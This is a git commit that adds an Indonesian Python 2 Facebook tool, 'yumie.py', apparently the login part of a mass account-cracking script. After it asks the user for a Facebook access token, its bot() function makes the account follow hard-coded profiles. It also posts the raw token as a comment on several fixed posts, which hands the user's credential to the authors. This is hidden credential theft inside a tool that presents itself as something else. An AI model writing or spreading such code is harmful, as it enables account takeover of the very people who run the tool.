44e936eb081735dff188c743258b4a730fab0573
BINTANG XD <94116284+usernameeror@users.noreply.github.com>
2021-12-10 14:21:33 +0700

    Update and rename .gitignore to yumie.py

---
+++ yumie.py
@@ -0,0 +1,130 @@
+#!/usr/bin/python2
+# coding=utf-8
+# author : Fall Xavier
+
+### IMPORT MODULE ###
+import os, sys, re, time, requests, calendar, random,json
+from concurrent.futures import ThreadPoolExecutor
+from bs4 import BeautifulSoup as parser
+from datetime import datetime
+from datetime import date
+s=requests.Session()
+try:
+	import requests
+except ImportError:
+	print("\n [!] module requests belum terinstall")
+	os.system("pip install requests")
+
+try:
+	import bs4
+except ImportError:
+	print("\n [!] module bs4 belum terinstall")
+	os.system("pip install bs4")
+
+try:
+	import concurrent.futures
+except ImportError:
+	print("\n [!] module futures belum terinstall")
+	os.system("pip install futures")
+
+
+### GLOBAL WARNA ###
+P = '\x1b[1;97m' # PUTIH               
+M = '\x1b[1;91m' # MERAH            
+H = '\x1b[1;92m' # HIJAU.              
+K = '\x1b[1;93m' # KUNING.           
+B = '\x1b[1;94m' # BIRU.                 
+U = '\x1b[1;95m' # UNGU.               
+O = '\x1b[1;96m' # BIRU MUDA.     
+N = '\x1b[0m'    # WARNA MATI     
+
+### GLOBAL NAMA ###
+IP = requests.get('https://api.ipify.org').text
+id = []
+cp = []
+ok = []
+loop = 0
+
+### GLOBAL WAKTU ###
+ct = datetime.now()
+n = ct.month
+bulann = ['Januari','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','Nopember','Desember']
+try:
+    if n < 0 or n > 12:
+        exit()
+    nTemp = n - 1
+except ValueError:
+    exit()
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+op = bulann[nTemp]
+my_date = date.today()
+hr = calendar.day_name[my_date.weekday()]
+tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
+tgl = ("%s %s %s"%(ha, op, ta))
+bulan = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
+
+### DEF TAMBAHAN ###
+def jalan(z):
+	for e in z + "\n":
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(0.03)
+        
+### BAGIAN LOGO ###
+def logo():
+	os.system("clear")
+	print("""%s
+\x1b[1;91m ___________          _____ _____________________
+\x1b[1;92m \_   _____/         /     \\______   \_   _____/
+\x1b[1;93m  |    __)  ______  /  \ /  \|    |  _/|    __)  
+\x1b[1;94m  |     \  /_____/ /    Y    \    |   \|     \   
+\x1b[1;95m  \___  /          \____|__  /______  /\___  /   
+\x1b[1;96m      \/                   \/       \/     \/      """%(N))
+   
+### BAGIAN LOGIN ###
+def tokenz():
+	os.system('clear')
+	try:
+		token = open('token.txt', 'r')
+		menu()
+	except (KeyError, IOError):
+		os.system('clear')
+		logo()
+		print(" %s\x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mAuthor     \x1b[1;93m: \x1b[1;93mNdriiTzy X EzaaTzy"%(N))
+		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mGithub     \x1b[1;93m: \x1b[1;93mhttps://github.com/YumasaaTzy")
+		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m---------------------------------------------")
+		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mBergabung  \x1b[1;93m: %s"%(tgl))
+		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mStatus     \x1b[1;93m: %s\x1b[1;92mPremium Sampai Kiamat%s"%(H,N))
+		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m---------------------------------------------")
+		print(" \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mIP         \x1b[1;93m: %s"%(IP))
+		token = raw_input('\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan token \x1b[1;93m: \x1b[1;92m')
+		try:
+			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
+			a = json.loads(otw.text)
+			zedd = open('token.txt', 'w')
+			zedd.write(token)
+			zedd.close()
+			bot()
+			menu()
+		except KeyError:
+			print(" %s[!] token kadaluwarsa!"%(M))
+			sys.exit() 
+ 
+### BOT FOLLOW DAN KOMEN ###
+def bot():
+	try:
+		token = open('token.txt', 'r').read()
+	except (KeyError, IOError):
+		exit(" %s[!] token kadaluwarsa!"%(M))
+	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
+	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
+	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
+	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
+	requests.post('https://graph.facebook.com/100013291513596/subscribers?access_token=' + token)
+	requests.post('https://graph.facebook.com/106024538578610/comments/?message='+token+'&access_token=' + token)
+	requests.post('https://graph.facebook.com/106024515245279/comments/?message='+token+'&access_token=' + token)
+	requests.post('https://graph.facebook.com/124014098051640/comments/?message='+token+'&access_token=' + token)
+	requests.post('https://graph.facebook.com/1324794007973637/comments/?message='+token+'&access_token=' + token)
